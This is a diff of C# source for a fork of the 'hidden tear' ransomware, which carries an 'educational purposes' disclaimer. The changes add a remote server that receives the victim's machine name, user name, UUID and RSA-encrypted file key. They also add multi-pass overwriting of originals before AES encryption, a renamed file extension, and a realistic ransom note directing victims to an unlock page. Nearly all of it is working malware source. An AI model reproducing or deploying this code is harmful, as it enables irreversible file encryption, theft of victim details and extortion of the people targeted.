@@ -6,20 +6,9 @@
 | | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
 |_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|  
  
- * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com 
+ * Forked from the code by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com 
  * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
  * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
- * 
- * Ve durdu saatler 
- * Susuyor seni zaman
- * Sesin dondu kulagimda
- * Dedi uykudan uyan
- * 
- * Yine boyle bir aksamdi
- * Sen guluyordun ya gozlerimin icine
- * Feslegenler boy vermisti
- * Gokten parlak bir yildiz dustu pesine
- * Sakladim gozyaslarimi
  */
 
 using System;
@@ -39,6 +28,7 @@ using System.Net;
 using Microsoft.Win32;
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
+using Javascience;
 
 
 namespace hidden_tear
@@ -46,10 +36,15 @@ namespace hidden_tear
     public partial class Form1 : Form
     {
         //Url to send encryption password and computer info
-        string targetURL = "https://www.example.com/hidden-tear/write.php?info=";
+        string targetURL = "http://192.168.0.135:8888/test/evilvault.php?info=";
         string userName = Environment.UserName;
         string computerName = System.Environment.MachineName.ToString();
+        string UUID = Guid.NewGuid().ToString(); 
         string userDir = "C:\\Users\\";
+        
+        List<string> list_with_encrypted_files = new List<string>();
+        
+
 
 
 
@@ -77,7 +72,7 @@ namespace hidden_tear
         public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
         {
             byte[] encryptedBytes = null;
-            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+            byte[] saltBytes = new byte[] { 5, 8, 10, 78, 90, 56, 7, 8 };
             using (MemoryStream ms = new MemoryStream())
             {
                 using (RijndaelManaged AES = new RijndaelManaged())
@@ -108,17 +103,49 @@ namespace hidden_tear
         {
             const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
             StringBuilder res = new StringBuilder();
-            Random rnd = new Random();
+            
+            //avoiding the same seed with 
+            Random rnd = new Random(Guid.NewGuid().GetHashCode());
             while (0 < length--){
                 res.Append(valid[rnd.Next(valid.Length)]);
             }
             return res.ToString();
         }
+        
+ 
+        
+       public static string EncryptPassword(string password)
+        {
+            string ServerPubKeyOutput = "-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDbv/DGt9yCE8F93pcZatx/Uuef7m/ztRSrrS2p99Fl554/7XzGmktS3ArxyZOaz0rdhkdaZxzvZ6g8Ip0uBzTDcI5heVz3Ek0aCxIAiFZh/ScrtjIXg+JERty9cYZ6aBhMWn9tXEWWMOzYlumT6MpAdE8fzr1DTQqKpoSL0aDrAwIDAQAB-----END PUBLIC KEY-----";
+           
+            string ServerPubKey = Javascience.opensslkey.DecodePEMKey(ServerPubKeyOutput);
+
+            RSACryptoServiceProvider ServerRSA = new RSACryptoServiceProvider();
+            ServerRSA.FromXmlString(ServerPubKey);
+            string SecretPassword = Uri.EscapeDataString(Convert.ToBase64String(RSAEncrypt(Encoding.UTF8.GetBytes(password), ServerRSA.ExportParameters(false))));
+            
+            Console.WriteLine(SecretPassword);
+            return SecretPassword;
+
+        }
+        
+        static public byte[] RSAEncrypt(byte[] DataToEncrypt, RSAParameters RSAKeyInfo)
+        {
+            byte[] encryptedData;
+
+            RSACryptoServiceProvider RSA = new RSACryptoServiceProvider();
+            RSA.ImportParameters(RSAKeyInfo);
+
+            encryptedData = RSA.Encrypt(DataToEncrypt, true);
+
+            return encryptedData;
+        }
 
         //Sends created password target location
         public void SendPassword(string password){
             
-            string info = computerName + "-" + userName + " " + password;
+            string Encryptedpassword = EncryptPassword(password);
+            string info = UUID + "|" + computerName + "|" + userName + "|" + Encryptedpassword;
             var fullUrl = targetURL + info;
             var conent = new System.Net.WebClient().DownloadString(fullUrl);
         }
@@ -126,20 +153,36 @@ namespace hidden_tear
         //Encrypts single file
         public void EncryptFile(string file, string password)
         {
-
+             
             byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
+            
+            int filesize = bytesToBeEncrypted.Length;
+            
+            //Create bytearray with zeros
+            byte[] zeroes = new byte[filesize];
+            
+            //Create bytearray with random numbers
+            Random rnd = new Random();
+            byte[] randoms = new Byte[filesize];
+            rnd.NextBytes(randoms);
+            
             byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
-
             // Hash the password with SHA256
             passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
-
+            
             byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
-
+            
+            //first phase: overwrite with zeroes
+            File.WriteAllBytes(file, zeroes);
+            //second phase: overwrite with randoms
+            File.WriteAllBytes(file, randoms);
+            //third phase: overwrite with zeroes
+            File.WriteAllBytes(file, zeroes);
+            //fourth phase: overwrite file with encrypted data
             File.WriteAllBytes(file, bytesEncrypted);
-            System.IO.File.Move(file, file+".locked");
-
+            System.IO.File.Move(file, file+".Qwfsdfjio");
             
-            
+            list_with_encrypted_files.Add(file);
 
         }
 
@@ -147,10 +190,12 @@ namespace hidden_tear
         public void encryptDirectory(string location, string password)
         {
             
+   
+            
             //extensions to be encrypt
             var validExtensions = new[]
             {
-                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
+                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",".mp3"
             };
 
             string[] files = Directory.GetFiles(location);
@@ -170,9 +215,11 @@ namespace hidden_tear
         }
 
         public void startAction()
-        {
+        {   
+            string startsentence = "The following files are encrypted: \n\n";
+            list_with_encrypted_files.Add(startsentence);
             string password = CreatePassword(15);
-            string path = "\\Desktop\\test";
+            string path = "\\Desktop\\infectionzone";
             string startPath = userDir + userName + path;
             SendPassword(password);
             encryptDirectory(startPath,password);
@@ -183,10 +230,20 @@ namespace hidden_tear
 
         public void messageCreator()
         {
-            string path = "\\Desktop\\test\\READ_IT.txt";
+            //write message to user
+            string path = "\\Desktop\\VERY_IMPORTANT_READ_IT_.txt";
             string fullpath = userDir + userName + path;
-            string[] lines = { "Files have been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." };
+            string[] lines = { "Your documents, pictures, databases and other important files are encrypted with a strong encryption and unique key.\n",  "The private decryption key is saved on a secret server and nobody can decrypt your files  until you pay and obtain the private key\n\n", " Follow the following instructions if you want to decrypt your files: \n\n", "\n1. GO TO THIS WEBSITE: http://192.168.0.135:8888/test/unlock.html \n\n", "2. Copy past the following UUID in the form on the website",UUID,"\n\n", "3. Follow on the website the next instructions"};
             System.IO.File.WriteAllLines(fullpath, lines);
+            
+            //write list wit encrypted files
+            string path_with_list = "\\Desktop\\LIST_WITH_ENCRYPTED_FILES.txt";
+            string fullpath_for_list = userDir + userName + path_with_list;
+            string[] listlines = list_with_encrypted_files.ToArray();
+            System.IO.File.WriteAllLines(fullpath_for_list, listlines);
+            
+            
+            
         }
     }
 }
